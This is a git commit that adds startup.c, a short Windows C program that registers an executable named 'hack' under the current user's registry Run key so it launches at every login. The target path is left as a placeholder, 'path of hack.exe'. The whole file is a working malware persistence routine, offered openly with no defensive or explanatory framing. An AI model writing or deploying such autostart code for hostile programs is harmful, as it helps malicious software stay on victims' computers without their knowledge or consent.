943c7655446f77acfb725ba734fe2a3bd58426e7
rocky00-a <r93231445@gmail.com>
2026-06-25 23:15:51 +0530

    Create startup.c

---
+++ startup.c
@@ -0,0 +1,16 @@
+#include <windows.h>
+#include <string.h>
+int main(int argc, char* argv[]) {
+ HKEY hkey = NULL;
+
+
+ const char* exe = "path of hack.exe";
+ // startup
+ LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
+ if (result == ERROR_SUCCESS) {
+ 
+ RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+ RegCloseKey(hkey);
+ }
+ return 0;
+}
